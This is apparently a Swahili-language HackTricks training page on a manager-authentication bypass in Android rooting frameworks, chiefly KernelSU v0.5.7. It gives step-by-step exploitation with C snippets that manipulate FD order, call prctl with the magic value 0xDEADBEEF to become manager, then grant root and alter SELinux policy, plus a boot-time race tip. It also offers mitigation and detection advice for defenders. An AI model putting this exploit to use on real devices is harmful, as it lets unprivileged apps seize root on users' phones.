# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Frameworks za rooting kama KernelSU, APatch, SKRoot na Magisk mara nyingi huweka patch kwenye kernel ya Linux/Android na kufichua kazi za kibali kwa programu ya "manager" isiyo na kibali kupitia syscall iliyounganishwa. Ikiwa hatua ya uthibitishaji wa meneja ina kasoro, programu yoyote ya ndani inaweza kufikia njia hii na kuongeza kibali kwenye vifaa vilivyoshikiliwa tayari.

Ukurasa huu unatoa muhtasari wa mbinu na mitego iliyogunduliwa katika utafiti wa umma (hasa uchambuzi wa Zimperium wa KernelSU v0.5.7) kusaidia timu za red na blue kuelewa uso wa mashambulizi, misingi ya unyakuzi, na mipango thabiti ya kupunguza hatari.

---
## Mchoro wa usanifu: syscall-hooked manager channel

- Moduli ya kernel/patch inachukua syscall (kawaida prctl) kupokea "amri" kutoka kwa userspace.
- Protokali kwa kawaida ni: magic_value, command_id, arg_ptr/len ...
- Programu ya meneja ya userspace inathibitisha kwanza (mfano, CMD_BECOME_MANAGER). Mara kernel inapomwita kama meneja anayeaminika, amri za kibali zinakubaliwa:
- Pata root kwa mwitishaji (mfano, CMD_GRANT_ROOT)
- Simamia orodha za ruhusa/zuio kwa su
- Badilisha sera ya SELinux (mfano, CMD_SET_SEPOLICY)
- Uliza toleo/mipangilio
- Kwa sababu programu yoyote inaweza kuita syscalls, usahihi wa uthibitishaji wa meneja ni muhimu.

Mfano (muundo wa KernelSU):
- Syscall iliyounganishwa: prctl
- Thamani ya kichawi ili kuelekeza kwa mpangaji wa KernelSU: 0xDEADBEEF
- Amri zinajumuisha: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, nk.

---
## Mchakato wa uthibitishaji wa KernelSU v0.5.7 (kama ilivyotekelezwa)

Wakati userspace inaita prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU inathibitisha:

1) Ukaguzi wa awali wa njia
- Njia iliyotolewa lazima ianze na awali inayotarajiwa kwa UID ya mwitishaji, mfano /data/data/<pkg> au /data/user/<id>/<pkg>.
- Rejea: core_hook.c (v0.5.7) mantiki ya awali ya njia.

2) Ukaguzi wa umiliki
- Njia lazima iwe na umiliki wa UID ya mwitishaji.
- Rejea: core_hook.c (v0.5.7) mantiki ya umiliki.

3) Ukaguzi wa saini ya APK kupitia skana ya jedwali la FD
- Tembea vigezo vya faili vilivyo wazi vya mchakato wa mwitishaji (FDs).
- Chagua faili ya kwanza ambayo njia yake inalingana na /data/app/*/base.apk.
- Parse saini ya APK v2 na kuthibitisha dhidi ya cheti rasmi cha meneja.
- Rejea: manager.c (kuhusu FDs), apk_sign.c (uthibitisho wa APK v2).

Ikiwa ukaguzi wote unakubalika, kernel inahifadhi UID ya meneja kwa muda na inakubali amri za kibali kutoka kwa UID hiyo hadi iporomoke.

---
## Daraja la udhaifu: kuamini "APK ya kwanza inayolingana" kutoka kwa skana ya FD

Ikiwa ukaguzi wa saini unashikilia "APK ya kwanza inayolingana /data/app/*/base.apk" iliyopatikana katika jedwali la FD la mchakato, haithibitishi pakiti ya mwitishaji mwenyewe. Mshambuliaji anaweza kuweka APK iliyosainiwa kihalali (ya meneja halisi) ili ionekane mapema katika orodha ya FD kuliko base.apk yao wenyewe.

Kuamini kwa njia ya moja kwa moja kunawezesha programu isiyo na kibali kuiga meneja bila kumiliki funguo za saini za meneja.

Mali muhimu zinazotumika:
- Skana ya FD haishikilii kitambulisho cha pakiti ya mwitishaji; inalinganisha tu nyuzi za njia.
- open() inarudisha FD ya chini zaidi inayopatikana. Kwa kufunga FDs zenye nambari za chini kwanza, mshambuliaji anaweza kudhibiti mpangilio.
- Filter inakagua tu kwamba njia inalingana na /data/app/*/base.apk – si kwamba inahusiana na pakiti iliyosakinishwa ya mwitishaji.

---
## Masharti ya shambulizi

- Kifaa tayari kimejishikilia na mfumo wa rooting wenye udhaifu (mfano, KernelSU v0.5.7).
- Mshambuliaji anaweza kukimbia msimbo wowote usio na kibali ndani (mchakato wa programu ya Android).
- Meneja halisi bado hajathibitishwa (mfano, mara tu baada ya kuanzisha upya). Mifumo mingine huhifadhi UID ya meneja baada ya mafanikio; lazima ushinde mbio.

---
## Muhtasari wa unyakuzi (KernelSU v0.5.7)

Hatua za juu:
1) Jenga njia halali kwa saraka ya data ya programu yako ili kukidhi ukaguzi wa awali na umiliki.
2) Hakikisha APK halisi ya Meneja wa KernelSU imefunguliwa kwenye FD yenye nambari ya chini kuliko base.apk yako.
3) Itisha prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) ili kupita ukaguzi.
4) Toa amri za kibali kama CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY ili kudumisha ongezeko.

Maelezo ya vitendo kuhusu hatua ya 2 (mpangilio wa FD):
- Tambua FD ya mchakato wako kwa /data/app/*/base.apk yako kwa kutembea kwenye symlinks za /proc/self/fd.
- Funga FD ya chini (mfano, stdin, fd 0) na fungua APK halali ya meneja kwanza ili iweze kuchukua fd 0 (au index yoyote chini ya fd ya base.apk yako).
- Panga APK halali ya meneja pamoja na programu yako ili njia yake ikidhi filter ya kijinga ya kernel. Kwa mfano, weka chini ya njia ndogo inayolingana na /data/app/*/base.apk.

Mfano wa vipande vya msimbo (Android/Linux, kwa mfano tu):

Tathmini FDs wazi ili kutafuta entries za base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Force a lower-numbered FD kuonyesha kwenye APK halali ya meneja:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Msimamizi wa uthibitishaji kupitia prctl hook:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Baada ya mafanikio, amri zenye mamlaka (mfano):
- CMD_GRANT_ROOT: pandisha mchakato wa sasa kuwa root
- CMD_ALLOW_SU: ongeza kifurushi/chapa yako kwenye orodha ya ruhusa kwa su ya kudumu
- CMD_SET_SEPOLICY: badilisha sera ya SELinux kama inavyoungwa mkono na mfumo

Vidokezo vya race/persistence:
- Jisajili kama mpokeaji wa BOOT_COMPLETED katika AndroidManifest (RECEIVE_BOOT_COMPLETED) ili kuanza mapema baada ya kuanzisha upya na kujaribu uthibitisho kabla ya meneja halisi.

---
## Mwongozo wa kugundua na kupunguza

Kwa waendelezaji wa mfumo:
- Funga uthibitisho kwa kifurushi/chapa ya mpiga simu, si kwa FDs zisizo na mpangilio:
- Pata kifurushi cha mpiga simu kutoka kwa chapa yake na kuthibitisha dhidi ya saini ya kifurushi kilichosakinishwa (kupitia PackageManager) badala ya kuskanisha FDs.
- Ikiwa ni kernel pekee, tumia kitambulisho thabiti cha mpiga simu (task creds) na kuthibitisha kwenye chanzo thabiti cha ukweli kinachosimamiwa na init/userspace helper, si FDs za mchakato.
- Epuka ukaguzi wa njia-prefix kama kitambulisho; ni rahisi kutimizwa na mpiga simu.
- Tumia changamoto ya nonce–jibu kupitia channel na safisha kitambulisho chochote cha meneja kilichohifadhiwa wakati wa kuanzisha au kwenye matukio muhimu.
- Fikiria IPC iliyothibitishwa kwa kutumia binder badala ya kupakia syscalls za kawaida inapowezekana.

Kwa walinzi/timu ya buluu:
- Gundua uwepo wa mifumo ya rooting na michakato ya meneja; angalia kwa simu za prctl zenye nambari za kichawi zisizo za kawaida (mfano, 0xDEADBEEF) ikiwa una telemetry ya kernel.
- Katika meli zinazodhibitiwa, zuia au onyo juu ya wapokeaji wa kuanzisha kutoka kwa kifurushi kisichotegemewa ambacho kinajaribu haraka amri za meneja zenye mamlaka baada ya kuanzisha.
- Hakikisha vifaa vimeboreshwa kwa toleo la mfumo lililosasishwa; batilisha vitambulisho vya meneja vilivyohifadhiwa kwenye sasisho.

Vikwazo vya shambulio:
- Inahusisha tu vifaa ambavyo tayari vime-rooted na mfumo dhaifu.
- Kawaida inahitaji kuanzisha upya/dirisha la race kabla ya meneja halali kuthibitisha (mifumo mingine huhifadhi UID ya meneja hadi upya).

---
## Maelezo yanayohusiana kati ya mifumo

- Uthibitisho wa msingi wa nenosiri (mfano, toleo la kihistoria la APatch/SKRoot) unaweza kuwa dhaifu ikiwa nenosiri yanaweza kukisiwa/kupigwa nguvu au uthibitisho ni wa kasoro.
- Uthibitisho wa msingi wa kifurushi/saini (mfano, KernelSU) ni thabiti kwa kanuni lakini lazima uunganishwe na mpiga simu halisi, si vitu vya moja kwa moja kama skana za FD.
- Magisk: CVE-2024-48336 (MagiskEoP) ilionyesha kwamba hata mifumo iliyokomaa inaweza kuwa na hatari ya kudanganya kitambulisho inayopelekea utekelezaji wa msimbo na root ndani ya muktadha wa meneja.

---
## Marejeleo

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
